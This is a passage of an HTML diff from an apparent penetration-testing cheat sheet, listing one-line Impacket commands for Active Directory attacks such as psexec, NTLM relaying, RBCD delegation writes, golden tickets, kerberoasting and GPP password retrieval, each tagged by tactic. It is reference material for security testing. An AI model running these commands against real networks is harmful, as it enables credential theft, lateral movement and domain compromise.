+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-Reg/" id="/wadcoms/Impacket-Reg/" style="text-decoration: none; color: DarkGreen;">python3 reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-Reg/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-Reg/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Reg/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Reg/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Reg/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Reg/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Reg/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Reg/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Reg/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-RPCDump/" id="/wadcoms/Impacket-RPCDump/" style="text-decoration: none; color: DarkGreen;">python3 rpcdump.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-RPCDump/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-RPCDump/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RPCDump/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RPCDump/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RPCDump/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RPCDump/#RPC">RPC</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RPCDump/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RPCDump/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-RBCD/" id="/wadcoms/Impacket-RBCD/" style="text-decoration: none; color: DarkGreen;">python3 rbcd.py -action write -delegate-to &quot;DC01$&quot; -delegate-from &quot;EVILCOMPUTER$&quot; -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-RBCD/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-RBCD/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-RBCD/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-PsExec/" id="/wadcoms/Impacket-PsExec/" style="text-decoration: none; color: DarkGreen;">python3 psexec.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-PsExec/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-PsExec/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-PsExec-PassTheTicket/" id="/wadcoms/Impacket-PsExec-PassTheTicket/" style="text-decoration: none; color: DarkGreen;">export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1 -k -no-pass
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-PsExec-PassTheTicket/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-PsExec-PassTheTicket/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec-PassTheTicket/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec-PassTheTicket/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec-PassTheTicket/#TGS">TGS</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec-PassTheTicket/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec-PassTheTicket/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-PsExec-PassTheTicket/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-NTLMRelayX/" id="/wadcoms/Impacket-NTLMRelayX/" style="text-decoration: none; color: DarkGreen;">python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c &#39;whoami /all&#39; -debug
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-NTLMRelayX/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-NTLMRelayX/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-NTLMRelayX-WPAD/" id="/wadcoms/Impacket-NTLMRelayX-WPAD/" style="text-decoration: none; color: DarkGreen;">python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegate-access
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-NTLMRelayX-WPAD/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-NTLMRelayX-WPAD/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-WPAD/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-WPAD/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-WPAD/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-WPAD/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-WPAD/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-WPAD/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-NTLMRelayX-Socks/" id="/wadcoms/Impacket-NTLMRelayX-Socks/" style="text-decoration: none; color: DarkGreen;">python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -socks
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-NTLMRelayX-Socks/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-NTLMRelayX-Socks/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-Socks/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-Socks/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-Socks/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-Socks/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-Socks/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-NTLMRelayX-Socks/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-Mimikatz/" id="/wadcoms/Impacket-Mimikatz/" style="text-decoration: none; color: DarkGreen;">python3 mimikatz.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-Mimikatz/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-Mimikatz/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Mimikatz/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Mimikatz/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Mimikatz/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Mimikatz/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Mimikatz/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Mimikatz/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-LookUpSID/" id="/wadcoms/Impacket-LookUpSID/" style="text-decoration: none; color: DarkGreen;">python3 lookupsid.py test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-LookUpSID/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-LookUpSID/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-LookUpSID/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-LookUpSID/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-LookUpSID/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-LookUpSID/#RPC">RPC</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-LookUpSID/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-LookUpSID/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-GoldenTicket/" id="/wadcoms/Impacket-GoldenTicket/" style="text-decoration: none; color: DarkGreen;">python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 john
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-GoldenTicket/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-GoldenTicket/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GoldenTicket/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GoldenTicket/#Persistence">Persistence</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GoldenTicket/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GoldenTicket/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GoldenTicket/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GoldenTicket/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GoldenTicket/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-GetUserSPNs/" id="/wadcoms/Impacket-GetUserSPNs/" style="text-decoration: none; color: DarkGreen;">python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-GetUserSPNs/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-GetUserSPNs/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetUserSPNs/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetUserSPNs/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetUserSPNs/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetUserSPNs/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetUserSPNs/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetUserSPNs/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-GetNPUsers/" id="/wadcoms/Impacket-GetNPUsers/" style="text-decoration: none; color: DarkGreen;">python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -format hashcat -outputfile hashes.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-GetNPUsers/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-GetNPUsers/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetNPUsers/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetNPUsers/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetNPUsers/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetNPUsers/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetNPUsers/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-GetADUsers/" id="/wadcoms/Impacket-GetADUsers/" style="text-decoration: none; color: DarkGreen;">python3 GetADUsers.py -all test.local/john:password123 -dc-ip 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-GetADUsers/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-GetADUsers/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetADUsers/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetADUsers/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetADUsers/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetADUsers/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetADUsers/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-GetADUsers/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-Get-GPPPassword/" id="/wadcoms/Impacket-Get-GPPPassword/" style="text-decoration: none; color: DarkGreen;">python3 Get-GPPPassword.py &#39;TEST.local/john:password123@DC01.TEST.local&#39; -dc-ip 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-Get-GPPPassword/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-Get-GPPPassword/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-Get-GPPPassword/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Impacket-DCOMExec/" id="/wadcoms/Impacket-DCOMExec/" style="text-decoration: none; color: DarkGreen;">python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Impacket-DCOMExec/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Impacket-DCOMExec/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-DCOMExec/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-DCOMExec/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-DCOMExec/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-DCOMExec/#DCOM">DCOM</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-DCOMExec/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Impacket-DCOMExec/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/FindUncommonShares/" id="/wadcoms/FindUncommonShares/" style="text-decoration: none; color: DarkGreen;">python3 FindUncommonShares.py -u &#39;john&#39; -d &#39;TEST.local&#39; -p &#39;password123&#39; --dc-ip 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/FindUncommonShares/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/FindUncommonShares/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/FindUncommonShares/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/FindUncommonShares/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/FindUncommonShares/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/FindUncommonShares/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
